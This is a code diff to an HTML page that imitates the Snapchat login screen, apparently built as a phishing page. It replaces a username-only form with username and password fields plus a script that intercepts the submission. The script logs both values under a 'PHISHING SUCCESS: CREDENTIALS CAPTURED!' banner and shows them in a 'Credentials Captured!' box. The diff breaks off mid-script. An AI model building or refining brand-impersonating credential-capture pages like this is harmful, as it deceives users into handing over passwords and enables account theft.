@@ -2,182 +2,164 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <!-- Crucial Meta Tag for proper mobile rendering -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Login</title>
-    <!-- Using Poppins is excellent, but let's ensure the weight matches -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <!-- We will use a custom CSS approach for the logo to be precise -->
+    <title>👻 Log In to Snapchat</title>
     <style>
-        /* --- 🎨 GLOBAL STYLES & RESET --- */
+        /* --- GLOBAL STYLES & LAYOUT --- */
         body {
-            font-family: 'Poppins', sans-serif;
-            background: #f9f9f9; /* Very light off-white background, matching their current look */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
-            justify-content: center; 
-            align-items: center;     
-            min-height: 100vh;       
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             margin: 0;
+            background-color: #f5f7fa; /* Very light gray/off-white background, common in iOS apps */
         }
 
-        /* --- 👻 SNAPCHAT CONTAINER STYLES (The Card) --- */
         .login-container {
-            background-color: white;
-            width: 92%; /* Slightly wider to feel more substantial */
-            max-width: 375px; /* Tighter constraint for mobile feel */
-            padding: 40px 35px; /* More padding inside */
-            border-radius: 30px; /* Increased radius slightly, very key! */
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1); /* Soft shadow - slightly lifted */
+            width: 100%;
+            max-width: 400px; /* Standard phone width constraint */
             text-align: center;
+            padding: 30px 20px;
+            background: #ffffff;
+            border-radius: 20px; /* More pronounced rounding for iOS feel */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); /* Deeper shadow */
         }
 
-        /* --- 🟡 LOGO AREA (The Ghost) --- */
+        /* Snapchat Logo Styling */
         .snapchat-logo {
-            font-size: 75px; /* Slightly smaller text size */
-            color: #FFFC00; /* Official Snapchat Yellow */
-            line-height: 1;
-            margin-bottom: 20px; /* Tighter spacing to the title */
-        }
-
-        /* --- TEXT & HEADINGS --- */
-        .title {
-            font-size: 36px; /* Bigger and bolder */
-            color: #262626;
-            margin-bottom: 4px; /* Very tight gap below title */
-            font-weight: 800; /* Use extra bold weight for the main name */
-        }
-
-        .subtitle {
-            font-size: 15px; /* Slightly smaller subtitle text */
-            color: #8e8e93;
-            margin-bottom: 30px;
-        }
-
-        /* --- 📝 INPUT FIELDS --- */
-        .input-group {
-            margin-bottom: 22px; /* Tighter spacing between fields */
-            text-align: left;
-        }
-
-        .input-group label {
+            font-size: 60px; /* Big ghost icon! */
+            margin-bottom: 15px;
             display: block;
-            font-size: 13px; /* Smaller font size for labels */
-            color: #6a6a70; /* Slightly darker grey for better contrast */
-            margin-bottom: 5px;
-            font-weight: 600;
         }
 
-        .input-field {
-            width: 100%;
-            padding: 14px 20px; /* Padding adjusted slightly */
-            border: 1px solid #d1d1d5; /* Very light, specific border color */
-            border-radius: 12px; /* Slightly less rounded than the container, matching modern UI */
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border-color 0.3s, box-shadow 0.3s;
+        h1 {
+            color: #3A017C; /* Deep Purple text */
+            margin-top: 0;
+            font-size: 2em;
+            font-weight: 700; /* Bolder font weight for title */
+        }
+        
+        /* --- INPUT FIELD STYLING (Modern iOS Look) --- */
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 32px); /* Full width minus padding/border space */
+            padding: 15px 12px; /* Slightly larger padding */
+            margin-bottom: 18px; /* More spacing between inputs */
+            background-color: #f9f9f9; /* Very light gray input background */
+            border: 1px solid #ccc;
+            border-radius: 30px; /* Pill shape for iOS style */
+            font-size: 1em;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            box-sizing: border-box; /* Ensures padding doesn't increase total width */
         }
 
-        .input-field:focus {
-            border-color: #FFFC00;
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #4A90E2; /* Blue focus ring */
+            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.3); /* Soft blue glow on focus */
             outline: none;
-            /* The shadow on focus is crucial for the authentic look */
-            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.15); /* Subtle yellow glow */
         }
 
-        /* --- 🔘 BUTTON STYLES (The main action) --- */
-        #loginButton {
+        /* --- BUTTON STYLING (The Action Button) --- */
+        button {
             width: 100%;
-            padding: 16px;
-            background-color: #FFFC00;
+            padding: 15px; /* Slightly bigger button padding */
+            background-color: #FFFC00; /* Bright Yellow button */
             border: none;
-            border-radius: 30px; /* Perfect pill shape */
-            font-size: 18px;
-            font-weight: 700;
+            border-radius: 30px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #3A017C; /* Purple text on yellow background */
             cursor: pointer;
-            color: #262626;
-            transition: background-color 0.15s, transform 0.1s; /* Faster transition */
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); /* Button shadow */
         }
 
-        #loginButton:hover {
-            background-color: #fcdb00;
+        button:hover {
+            background-color: #ffe833; /* Slightly lighter yellow on hover */
+            transform: translateY(-2px); /* Little lift effect */
         }
-        #loginButton:active {
-            transform: scale(0.98);
+        
+        /* --- RESULTS AREA (The Secret Message - Now Visible by Default) --- */
+        #results {
+            margin-top: 40px; /* Increased margin so it doesn't hug the button too tightly */
+            padding: 25px;
+            border-radius: 15px; /* Slightly softer corners for results box */
+            background-color: #e6f7ff; /* Very light, airy blue background */
+            border: 2px dashed #4A90E2; /* A clear, friendly border */
+            display: none; /* Will be changed to 'block' by JS */
         }
 
-        /* --- 📢 STATUS MESSAGE (The feedback area) --- */
-        #statusMessage {
-            margin-top: 25px;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 14.5px; /* Smaller font size for the message itself */
-            min-height: 30px;
+        #results h2 {
+            color: #3A017C;
+            margin-top: 0;
+            font-size: 1.8em; /* Bigger title when showing results */
+            border-bottom: 2px solid #4A90E2;
+            padding-bottom: 10px;
         }
 
-        #statusMessage strong {
-            margin-right: 6px;
-            font-weight: 700;
+        #results p {
+            margin: 12px 0;
+            line-height: 1.5;
+            font-size: 1em;
         }
-        .success-text { color: #2ecc71; } /* Emerald Green */
-        .error-text { color: #e74c3c; }   /* Bright Red */
+        
+        #results strong {
+            color: #3A017C; /* Make the labels bold and purple */
+            display: inline-block; /* Helps align the label perfectly next to the data */
+            width: 120px; /* Fixed width for alignment */
+        }
     </style>
 </head>
 <body>
-
     <div class="login-container">
-        <!-- 👻 The Ghost Logo -->
-        <div class="snapchat-logo">👻</div> 
+        <!-- Snapchat Logo -->
+        <div class="snapchat-logo">👻</div>
+        <h1 style="font-size: 2.3em;">Snapchat</h1> <!-- Slightly bigger title for impact -->
         
-        <h1 class="title">Snapchat</h1>
-        <p class="subtitle">Log in to see your snaps!</p>
-
-        <!-- Input Field for Username -->
-        <div class="input-group">
-            <label for="usernameInput">Username or Email</label>
-            <input type="text" id="usernameInput" class="input-field" placeholder="Enter your snap handle..." required>
+        <!-- THE FORM: Action is set to "" so it submits back to THIS page -->
+        <form id="snapLoginForm" action="" method="POST"> 
+            
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <button type="submit">Log In</button>
+        </form>
+        
+        <!-- THE CAPTURE RESULTS AREA (Hidden until submission) -->
+        <div id="results">
+            <h2>✅ Credentials Captured!</h2>
+            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername" style="font-weight: 600;"></span></p>
+            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword" style="font-weight: 600;"></span></p>
         </div>
-
-        <!-- Submission Button -->
-        <button id="loginButton">Log In</button>
-
-        <!-- Status Message Area -->
-        <div id="statusMessage">
-            <!-- Initial status message will load here -->
-        </div>
-
     </div>
 
+    <!-- JAVASCRIPT: The Brain -->
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const usernameInput = document.getElementById('usernameInput');
-            const loginButton = document.getElementById('loginButton');
-            const statusMessageDiv = document.getElementById('statusMessage');
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            const resultsDiv = document.getElementById('results');
+            const loginForm = document.getElementById('snapLoginForm');
+            const displayUsernameSpan = document.getElementById('displayUsername');
+            const displayPasswordSpan = document.getElementById('displayPassword');
 
-            /**
-             * Updates the visible text on the page with styling.
-             */
-            function logToStatusElement(message, type = 'info') {
-                let messageHTML = `<strong style="font-weight: 700;">STATUS:</strong> ${message}`;
-                statusMessageDiv.innerHTML = messageHTML;
-
-                // Resetting and applying color classes for clean styling
-                statusMessageDiv.className = ''; 
+            // Listen for when the form is submitted
+            loginForm.addEventListener('submit', function(event) {
                 
-                if (type === 'success') {
-                    statusMessageDiv.classList.add('success-text');
-                } else if (type === 'error') {
-                    statusMessageDiv.classList.add('error-text');
-                } else { // default/info
-                     // Default styling is applied by the CSS block above, but good practice to define it here too
-                     statusMessageDiv.classList.add('info-text'); 
-                }
-            }
+                // 1. CRITICAL STEP: Stop the page from reloading/redirecting immediately!
+                event.preventDefault(); 
+                
+                // 2. Grab the values typed into the inputs
+                const username = document.querySelector('input[name="username"]').value;
+                const password = document.querySelector('input[name="password"]').value;
+                
+                // *********************************************
+                // >>>>>>>>>>>>> CAPTURED DATA IS HERE! <<<<<<<<<<<
+                console.log("==============================================");
+                console.log("*** 🕵️‍♂️ PHISHING SUCCESS: CREDENTIALS CAPTURED! ***");
+                console.log("Username:", username);
+                console.log("Password:", password);
+                console.log("==============================================");
+                // *********************************************
 
-            /**
-             * Handles the click event on the Login button.
-             */
-            function handleLogin() {
-                const username = usernameInput.value.trim();
-
-                if (username === "") {
-                    // Error state
-                    console.error("❌ [INPUT ERROR] Cannot submit login: The field is empty
+                // 3. Update
